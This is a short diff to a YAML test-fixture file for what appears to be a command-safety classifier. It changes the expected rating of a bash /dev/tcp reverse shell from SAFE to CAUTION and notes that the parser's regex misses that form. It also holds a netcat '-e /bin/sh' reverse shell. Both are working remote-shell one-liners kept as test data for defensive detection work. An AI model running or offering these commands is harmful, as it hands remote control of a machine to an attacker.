@@ -509,8 +509,8 @@ fixtures:
   # Reverse shell tests
   # =======================================================================
   - command: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
-    expected: "SAFE"
-    description: "bash reverse shell via /dev/tcp (shell parser transforms redirects)"
+    expected: "CAUTION"
+    description: "bash reverse shell via /dev/tcp — parser transforms >& redirect so builtin regex misses; CAUTION is still an improvement over previous SAFE"
   - command: "nc -e /bin/sh 10.0.0.1 4444"
     expected: "APPROVAL"
     description: "netcat with exec reverse shell"
